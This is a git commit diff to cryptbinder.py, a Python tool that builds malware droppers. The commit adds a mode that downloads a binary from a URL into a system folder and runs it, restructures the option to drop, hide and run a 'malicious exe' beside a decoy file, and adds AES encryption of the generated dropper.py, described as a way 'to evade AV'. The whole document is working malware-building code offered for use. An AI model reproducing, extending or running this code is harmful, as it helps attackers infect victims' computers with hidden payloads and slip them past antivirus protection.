d6b58b439cd00056ad18396c480246ee854a67c3
d4rkcat <d4rkcat@yandex.com>
2014-11-24 15:54:28 +0000

    Added URL drop, cleaned code

--- cryptbinder.py
+++ cryptbinder.py
@@ -26,38 +26,39 @@ def randVar():
 parser = argparse.ArgumentParser(prog='cryptbinder', usage='./cryptbinder.py [options]')
 parser.add_argument('-m', "--mexe", type=str, help='Malicious exe/bat/vbs to drop, hide and run.')
 parser.add_argument('-i', "--iexe", type=str, help='Inert exe/bat/vbs to drop and run.')
+parser.add_argument("-u", "--url", type=str, help="URL to download and run binary from.")
 parser.add_argument("-v", "--var", type=str, help="System variable to place the files, eg TEMP")
+parser.add_argument('-e', "--encrypt", action="store_true", help='Encrypt the dropper to evade AV.')
 args = parser.parse_args()
 
 if not args.mexe or not args.iexe or not args.var:
-	parser.print_help()
-	exit()
+	if not args.url or not args.var:
+		parser.print_help()
+		exit()
 
 BLOCK_SIZE, PADDING = 32, '{'
 pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
-key, iv = randKey(32), randKey(16)
+key, iv, enctype = randKey(32), randKey(16), ''
+cipherEnc = AES.new(key)
 bd64var, AESvar = randVar(), randVar()
-myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'import os', 'import threading', 'from hashlib import sha256']
-	
-with open(args.mexe, 'rb') as exe:
-	mexe = exe.read().encode('base64')
+if args.encrypt:
+	myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'import os']
+else:
+	myendings = ['import os']
 
-with open(args.iexe, 'rb') as exe:
-	iexe = exe.read().encode('base64')
+if args.mexe or args.iexe:
+	if args.url:
+		print ' [X] url cannot be used with self-contained exes.'
+		sys.exit()
+	myendings.append('from hashlib import sha256')
+	with open(args.mexe, 'rb') as exe:
+		mexe = exe.read().encode('base64')
+	with open(args.iexe, 'rb') as exe:
+		iexe = exe.read().encode('base64')
 
-template = '''
-def ft1():
-	try:
-		os.popen('attrib +h ' + fullpath)
-	except:
-		pass
-	os.startfile(fullpath)
-
-def ft2():
-	os.startfile(fullpath2)
-
+	template = '''
 pathto = os.getenv("%s")
 filename = "%s"
 content = "%s"
@@ -82,18 +83,42 @@ for p in paths:
 		with open(p[0], 'wb') as out:
 			out.write(p[1].decode('base64'))
 
-t1 = threading.Thread(target = ft1)
-t2 = threading.Thread(target = ft2)
-t1.start()
-t2.start()
+try:
+	os.popen('attrib +h ' + fullpath)
+except:
+	pass
+os.startfile(fullpath)
+os.startfile(fullpath2)
 ''' % (args.var, args.mexe.split(os.sep)[-1], mexe.replace('\n', ''), args.iexe.split(os.sep)[-1], iexe.replace('\n', ''))
+	encrypted = EncodeAES(cipherEnc, template)
 
-cipherEnc = AES.new(key)
-encrypted = EncodeAES(cipherEnc, template)
+elif args.url:
+	if args.mexe or args.iexe:
+		print ' [X] url cannot be used with self-contained exes.'
+		sys.exit()
+	myendings.append('import urllib2')
+	template = '''
+url = "%s"
+down = urllib2.urlopen(url)
+filename = url.split('/')[-1]
+exe = down.read()
+pathto = os.getenv("%s")
+fullpath = pathto + os.sep + filename
+with open(fullpath, 'wb') as f:
+	f.write(exe)
+os.startfile(fullpath)
+''' % (args.url, args.var)
+	encrypted = EncodeAES(cipherEnc, template)
+
+
 random.shuffle(myendings)
 
 with open('dropper.py', 'w') as drop:
 	drop.write(";".join(myendings) + "\n")
-	drop.write("exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,encrypted))))
+	if args.encrypt:
+		drop.write("exec(%s(\"%s\"))" % (bd64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(AESvar,key,bd64var,encrypted))))
+		enctype = 'encrypted '
+	else:
+		drop.write(template)
 
-print ' [*] dropper written to dropper.py'
+print ' [*] %sdropper written to dropper.py' % (enctype)
